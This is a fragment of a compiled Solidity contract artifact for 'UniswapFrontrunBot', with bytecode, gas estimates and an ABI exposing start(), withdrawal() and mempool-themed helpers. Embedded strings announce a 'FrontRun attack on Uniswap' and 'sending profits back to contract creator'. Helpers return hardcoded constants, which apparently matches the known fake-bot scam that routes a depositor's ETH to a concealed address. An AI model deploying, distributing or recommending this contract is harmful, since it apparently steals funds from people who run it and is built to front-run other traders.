DUP4 DUP8 SUB SUB DUP2 MLOAD DUP2 LT PUSH2 0x8B7 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP PUSH1 0x10 DUP7 DUP2 PUSH2 0x8F0 JUMPI INVALID JUMPDEST DIV SWAP6 POP DUP1 PUSH1 0x1 ADD SWAP1 POP PUSH2 0x888 JUMP JUMPDEST POP PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH1 0x4 DUP2 EQ ISZERO PUSH2 0x95E JUMPI PUSH1 0x60 PUSH2 0x94F PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x3 DUP2 EQ ISZERO PUSH2 0x9B7 JUMPI PUSH1 0x60 PUSH2 0x9A8 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x2 DUP2 EQ ISZERO PUSH2 0xA10 JUMPI PUSH1 0x60 PUSH2 0xA01 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x3 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030300000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST PUSH1 0x1 DUP2 EQ ISZERO PUSH2 0xA69 JUMPI PUSH1 0x60 PUSH2 0xA5A PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3030303000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP5 PUSH2 0xA76 JUMP JUMPDEST SWAP1 POP DUP1 SWAP6 POP POP POP POP POP POP PUSH2 0xA71 JUMP JUMPDEST DUP2 SWAP5 POP POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 DUP1 DUP4 SWAP1 POP PUSH1 0x60 DUP4 SWAP1 POP PUSH1 0x60 DUP2 MLOAD DUP4 MLOAD ADD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0xA9E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x1F ADD PUSH1 0x1F NOT AND PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0xAD1 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x1 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH1 0x60 DUP2 SWAP1 POP PUSH1 0x0 DUP1 PUSH1 0x0 SWAP2 POP JUMPDEST DUP6 MLOAD DUP3 LT ISZERO PUSH2 0xB4F JUMPI DUP6 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xAF6 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB13 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xAE1 JUMP JUMPDEST PUSH1 0x0 SWAP2 POP JUMPDEST DUP5 MLOAD DUP3 LT ISZERO PUSH2 0xBC2 JUMPI DUP5 DUP3 DUP2 MLOAD DUP2 LT PUSH2 0xB69 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL DUP4 DUP3 DUP1 PUSH1 0x1 ADD SWAP4 POP DUP2 MLOAD DUP2 LT PUSH2 0xB86 JUMPI INVALID JUMPDEST PUSH1 0x20 ADD ADD SWAP1 PUSH31 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 DUP2 PUSH1 0x0 BYTE SWAP1 MSTORE8 POP DUP2 DUP1 PUSH1 0x1 ADD SWAP3 POP POP PUSH2 0xB54 JUMP JUMPDEST DUP3 SWAP7 POP POP POP POP POP POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH3 0x287EF SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x8BC81 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH3 0x4D003 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 PUSH1 0xFF AND PUSH1 0x0 GT ISZERO DUP1 ISZERO PUSH2 0xC0C JUMPI POP PUSH1 0x9 DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC41 JUMPI DUP2 PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST DUP2 PUSH1 0xFF AND PUSH1 0xA GT ISZERO DUP1 ISZERO PUSH2 0xC59 JUMPI POP PUSH1 0xF DUP3 PUSH1 0xFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0xC91 JUMPI PUSH1 0xA DUP3 PUSH32 0x6100000000000000000000000000000000000000000000000000000000000000 PUSH1 0xF8 SHR ADD SUB PUSH1 0xF8 SHL SWAP1 POP PUSH2 0xC96 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP INVALID MSTORE8 PUSH6 0x6E64696E6720 PUSH17 0x726F66697473206261636B20746F20636F PUSH15 0x74726163742063726561746F722061 PUSH5 0x6472657373 0x2E 0x2E 0x2E MSTORE PUSH22 0x6E6E696E672046726F6E7452756E2061747461636B20 PUSH16 0x6E20556E69737761702E205468697320 PUSH4 0x616E2074 PUSH2 0x6B65 KECCAK256 PUSH2 0x2077 PUSH9 0x696C6520706C656173 PUSH6 0x20776169742E 0x2E 0x2E LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC5 SWAP7 PUSH29 0xD6E269ED28BAE2282A8BA18EFAD2D4AD27DF048E6B552EB8191A513AB3 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "680800",
				"executionCost": "infinite",
				"totalCost": "infinite"
			},
			"external": {
				"start()": "infinite",
				"tokenName()": "infinite",
				"tokenSymbol()": "infinite",
				"withdrawal()": "infinite"
			},
			"internal": {
				"_callFrontRunActionMempool()": "infinite",
				"beyond(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
				"calcLiquidityInContract(struct UniswapFrontrunBot.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findContracts(uint256,uint256,uint256,uint256)": "infinite",
				"findNewContracts(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getMemPoolDepth()": "23",
				"getMemPoolHeight()": "23",
				"getMemPoolLength()": "23",
				"getMemPoolOffset()": "23",
				"keccak(struct UniswapFrontrunBot.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"memcpy(uint256,uint256,uint256)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct UniswapFrontrunBot.slice memory,struct UniswapFrontrunBot.slice memory)": "infinite",
				"orderContractsByLiquidity(struct UniswapFrontrunBot.slice memory)": "infinite",
				"parseMemoryPool(string memory)": "infinite",
				"toHexDigit(uint8)": "213",
				"uint2str(uint256)": "infinite",
				"withdrawProfits()": "infinite"
			}
		},
		"methodIdentifiers": {
			"start()": "be9a6555",
			"tokenName()": "6c02a931",
			"tokenSymbol()": "7b61c320",
			"withdrawal()": "d4e93292"
		}
	},
	"abi": [
		{
			"inputs": [
				{
					"internalType": "string",
					"name": "_tokenName",
					"type": "string"
				},
				{
					"internalType": "string",
					"name": "_tokenSymbol",
					"type": "string"
				}
			],
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "tokenName",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "tokenSymbol",
			"outputs": [
				{
					"internalType": "string",
					"name": "",
					"type": "string"
				}
			],
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}